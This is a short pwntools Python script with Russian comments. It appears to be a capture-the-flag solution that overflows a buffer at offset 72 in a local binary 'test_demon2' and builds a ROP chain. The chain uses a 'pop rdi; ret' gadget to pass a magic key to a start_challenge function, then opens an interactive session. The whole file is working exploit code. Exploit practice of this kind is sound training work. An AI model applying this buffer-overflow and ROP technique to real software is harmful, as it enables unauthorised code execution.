from pwn import *

# Заданное смещение
offset = 72

# Получи адреса через Ghidra/objdump:
pop_rdi_ret = 0x0040119a      # Заменить на настоящий адрес гаджета "pop rdi; ret"
start_challenge = 0x0040132d  # Заменить на настоящий адрес функции start_challenge

# Магический ключ, который должен передаться в RDI
magic_key = 0x13371337

# Собираем payload
payload = b"A" * offset + p64(pop_rdi_ret) + p64(magic_key) + p64(start_challenge)
log.info("Payload: " + repr(payload))

# Запускаем бинарник и отправляем payload
p = process("./test_demon2")
p.sendline(payload)
p.interactive()
